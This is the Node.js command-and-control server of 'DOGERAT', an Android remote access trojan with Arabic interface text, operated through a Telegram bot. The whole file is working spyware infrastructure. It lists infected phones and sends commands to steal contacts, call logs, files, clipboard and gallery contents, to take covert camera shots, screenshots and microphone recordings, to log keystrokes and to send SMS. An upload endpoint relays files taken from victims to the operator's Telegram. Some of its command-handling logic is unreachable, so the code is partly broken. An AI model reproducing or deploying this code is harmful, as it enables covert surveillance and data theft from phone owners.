const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const upload = multer();
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new TelegramBot(data.token, { polling: true, request: {} });

const appData = new Map();
const actions = [
    '✯ جهات الاتصال ✯',
    '✯ المكالمات ✯',
    '✯ الكاميرا الرئيسية ✯',
    '✯ الكاميرا الامامية ✯',
    '✯ الاهتزاز ✯',
    '✯ الميكروفون ✯',
    '✯ المعرض ✯',
    '✯ لوحة المفاتيح ✯',
    '✯ تشغيل الصوت ✯',
    '✯ ايقاف الصوت ✯',
    '✯ الحافظة ✯',
    '✯ ارسال رسالة ✯',
    '✯ فتح رابط ✯',
    '✯ لقطة شاشة ✯',
    '✯ عرض اشعار ✯',
    '✯ عرض رسالة ✯',
    '✯ الملفات ✯',
    '✯ تشغيل لوحة المفاتيح ✯',
    '✯ ايقاف لوحة المفاتيح ✯'
];

// رفع الملفات
app.post('/upload', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    bot.sendDocument(data.id, req.file.buffer, {
        caption: '<b>ملف مستلم من → ' + req.file.originalname + '</b>',
        parse_mode: 'HTML'
    }, { filename: filename, contentType: req.file.mimetype });
    res.send('تم الاستلام');
});

// صفحة البداية
app.get('/', (req, res) => {
    res.send(`<b>مرحباً بك في DOGERAT</b>`);
});

// عند اتصال جهاز جديد
io.on('connection', (socket) => {
    const deviceName = socket.handshake.headers['model'] || 'غير معروف';
    const deviceVersion = socket.handshake.headers['version'] || 'لا توجد معلومات';
    const deviceIp = socket.handshake.address || 'غير معروف';

    socket.deviceName = deviceName;
    socket.deviceVersion = deviceVersion;
    socket.deviceIp = deviceIp;

    bot.sendMessage(data.id, 
        `<b>✯ جهاز جديد متصل ✯</b>\n\n` +
        `<b>الاسم → </b>${deviceName}\n` +
        `<b>الاصدار → </b>${deviceVersion}\n` +
        `<b>الاي بي → </b>${deviceIp}\n\n` +
        `<b>الوقت → </b>${new Date().toLocaleString()}`,
        { parse_mode: 'HTML' }
    );

    // عند انقطاع الاتصال
    socket.on('disconnect', () => {
        bot.sendMessage(data.id, 
            `<b>✯ جهاز تم فصل اتصاله ✯</b>\n\n` +
            `<b>الاسم → </b>${deviceName}\n` +
            `<b>الاصدار → </b>${deviceVersion}\n` +
            `<b>الاي بي → </b>${deviceIp}\n\n` +
            `<b>الوقت → </b>${new Date().toLocaleString()}`,
            { parse_mode: 'HTML' }
        );
    });

    // استقبال رسائل من الجهاز وارسالها للادمن
    socket.on('message', (msg) => {
        bot.sendMessage(data.id, `<b>✯ رسالة مستلمة من → ${deviceName}</b>\n\n${msg}`, { parse_mode: 'HTML' });
    });
});

// استقبال اوامر البوت
bot.on('message', (msg) => {
    const text = msg.text;

    if(text === '/start'){
        bot.sendMessage(data.id, 
            `<b>✯ مرحباً بك في DOGERAT</b>\n\n` +
            `DOGERAT هو برنامج تحكم في اجهزة الاندرويد\n` +
            `اي استخدام خاطئ يقع على عاتق المستخدم فقط!\n\n` +
            `مطور بواسطة: @CYBERSHIELDX`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ الاجهزة ✯', '✯ اختيار جهاز ✯'],
                        ['✯ حول البرنامج ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    // عرض الاجهزة المتصلة
    else if(text === '✯ الاجهزة ✯'){
        if(io.sockets.sockets.size === 0){
            bot.sendMessage(data.id, `<b>✯ لا يوجد اي اجهزة متصلة حالياً ✯</b>`, { parse_mode: 'HTML' });
        } else {
            let list = `<b>✯ الاجهزة المتصلة العدد: ${io.sockets.sockets.size}</b>\n\n`;
            let count = 1;
            io.sockets.sockets.forEach((sock) => {
                list += `${count}. ${sock.deviceName}\n` +
                        `<b>الاصدار → </b>${sock.deviceVersion}\n` +
                        `<b>الاي بي → </b>${sock.deviceIp}\n\n`;
                count++;
            });
            bot.sendMessage(data.id, list, { parse_mode: 'HTML' });
        }
    }

    // اختيار جهاز
    else if(text === '✯ اختيار جهاز ✯'){
        if(io.sockets.sockets.size === 0){
            bot.sendMessage(data.id, `<b>✯ لا يوجد اي اجهزة متصلة حالياً ✯</b>`, { parse_mode: 'HTML' });
        } else {
            let buttons = [];
            io.sockets.sockets.forEach((sock) => {
                buttons.push([sock.deviceName]);
            });
            buttons.push(['✯ رجوع للقائمة الرئيسية ✯']);
            bot.sendMessage(data.id, `<b>✯ اختر الجهاز المطلوب ✯</b>`, {
                parse_mode: 'HTML',
                reply_markup: { keyboard: buttons, resize_keyboard: true, one_time_keyboard: true }
            });
        }
    }

    // عند اختيار جهاز معين
    else if(appData.get('waitingTarget')){
        let found = false;
        io.sockets.sockets.forEach((sock) => {
            if(sock.deviceName === text){
                appData.set('currentTarget', sock.id);
                found = true;
                bot.sendMessage(data.id, `<b>✯ تم اختيار الجهاز: ${text}</b>\n\nاختر ما تريد فعله به:`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ جهات الاتصال ✯', '✯ المكالمات ✯'],
                            ['✯ الكاميرا الرئيسية ✯', '✯ الكاميرا الامامية ✯'],
                            ['✯ الاهتزاز ✯', '✯ الميكروفون ✯'],
                            ['✯ المعرض ✯', '✯ الحافظة ✯'],
                            ['✯ لقطة شاشة ✯', '✯ الملفات ✯'],
                            ['✯ تشغيل الصوت ✯', '✯ فتح رابط ✯'],
                            ['✯ ارسال رسالة ✯', '✯ عرض اشعار ✯'],
                            ['✯ تشغيل لوحة المفاتيح ✯', '✯ ايقاف لوحة المفاتيح ✯'],
                            ['✯ رجوع ✯']
                        ],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
        });
        if(text === '✯ رجوع للقائمة الرئيسية ✯'){
            appData.delete('waitingTarget');
            appData.delete('currentTarget');
        }
        if(!found && text !== '✯ رجوع للقائمة الرئيسية ✯'){
            bot.sendMessage(data.id, `<b>✯ هذا الجهاز غير متصل ✯</b>`);
        }
        appData.delete('waitingTarget');
    }

    // اوامر التحكم بالجهاز المختار
    else if(appData.get('currentTarget')){
        const target = appData.get('currentTarget');

        if(text === '✯ رجوع ✯'){
            appData.delete('currentTarget');
            bot.sendMessage(data.id, `<b>✯ تم العودة ✯</b>`);
        }
        else if(text === '✯ المعرض ✯'){
            io.to(target).emit('commend', { request: 'gallery', extras: [] });
            bot.sendMessage(data.id, `<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...</b>`, { parse_mode: 'HTML' });
        }
        else if(text === '✯ الاهتزاز ✯'){
            appData.set('waitingVibrate', true);
            bot.sendMessage(data.id, `<b>✯ ادخل مدة الاهتزاز بالثواني</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['الغاء']], resize_keyboard: true, one_time_keyboard: true } });
        }
        else if(text === '✯ الميكروفون ✯'){
            appData.set('waitingMic', true);
            bot.sendMessage(data.id, `<b>✯ ادخل مدة التسجيل بالثواني</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['الغاء']], resize_keyboard: true, one_time_keyboard: true } });
        }
        else if(text === '✯ ارسال رسالة ✯'){
            appData.set('waitingSms', true);
            bot.sendMessage(data.id, `<b>✯ ادخل الرقم ثم الرسالة</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['الغاء']], resize_keyboard: true, one_time_keyboard: true } });
        }
        else if(text === '✯ عرض اشعار ✯'){
            appData.set('waitingNotify', true);
            bot.sendMessage(data.id, `<b>✯ ادخل نص الاشعار</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['الغاء']], resize_keyboard: true, one_time_keyboard: true } });
        }
        else if(text === '✯ فتح رابط ✯'){
            appData.set('waitingUrl', true);
            bot.sendMessage(data.id, `<b>✯ ادخل الرابط</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['الغاء']], resize_keyboard: true, one_time_keyboard: true } });
        }
        // باقي الاوامر
        else if(actions.includes(text)){
            const reqMap = {
                '✯ جهات الاتصال ✯': 'contacts',
                '✯ المكالمات ✯': 'calls',
                '✯ الكاميرا الرئيسية ✯': 'main-camera',
                '✯ الكاميرا الامامية ✯': 'selfie-camera',
                '✯ الحافظة ✯': 'clipboard',
                '✯ لقطة شاشة ✯': 'screenshot',
                '✯ الملفات ✯': 'file',
                '✯ تشغيل الصوت ✯': 'play-audio',
                '✯ ايقاف الصوت ✯': 'stop-audio',
                '✯ تشغيل لوحة المفاتيح ✯': 'keylogger-on',
                '✯ ايقاف لوحة المفاتيح ✯': 'keylogger-off'
            };
            if(reqMap[text]){
                io.to(target).emit('commend', { request: reqMap[text], extras: [] });
                bot.sendMessage(data.id, `<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...</b>`, { parse_mode: 'HTML' });
            }
        }
    }

    // استقبال القيم الاضافية
    else if(appData.get('waitingVibrate')){
        if(text === 'الغاء') { appData.delete('waitingVibrate'); return; }
        io.to(appData.get('currentTarget')).emit('commend', { request: 'vibrate', extras: [{key:'duration', value:text}] });
        appData.delete('waitingVibrate');
        bot.sendMessage(data.id, `<b>✯ تم الامر</b>`);
    }
    else if(appData.get('waitingMic')){
        if(text === 'الغاء') { appData.delete('waitingMic'); return; }
        io.to(appData.get('currentTarget')).emit('commend', { request: 'microphone', extras: [{key:'duration', value:text}] });
        appData.delete('waitingMic');
        bot.sendMessage(data.id, `<b>✯ تم الامر</b>`);
    }
    else if(appData.get('waitingSms')){
        if(text === 'الغاء') { appData.delete('waitingSms'); return; }
        const [num, ...rest] = text.split(' ');
        io.to(appData.get('currentTarget')).emit('commend', { request: 'sendSms', extras: [{key:'number', value:num}, {key:'text', value:rest.join(' ')}] });
        appData.delete('waitingSms');
        bot.sendMessage(data.id, `<b>✯ تم الامر</b>`);
    }
    else if(appData.get('waitingNotify')){
        if(text === 'الغاء') { appData.delete('waitingNotify'); return; }
        io.to(appData.get('currentTarget')).emit('commend', { request: 'popNotification', extras: [{key:'text', value:text}] });
        appData.delete('waitingNotify');
        bot.sendMessage(data.id, `<b>✯ تم الامر</b>`);
    }
    else if(appData.get('waitingUrl')){
        if(text === 'الغاء') { appData.delete('waitingUrl'); return; }
        io.to(appData.get('currentTarget')).emit('commend', { request: 'openUrl', extras: [{key:'url', value:text}] });
        appData.delete('waitingUrl');
        bot.sendMessage(data.id, `<b>✯ تم الامر</b>`);
    }

    // عند اختيار جهاز من القائمة
    else {
        appData.set('waitingTarget', true);
    }
});

// حفظ الاتصال نشط
setInterval(() => {
    io.sockets.sockets.forEach(s => s.emit('ping'));
}, 5000);

// تشغيل السيرفر
server.listen(process.env.PORT || 3000, () => {
    console.log('يعمل على المنفذ 3000');
});
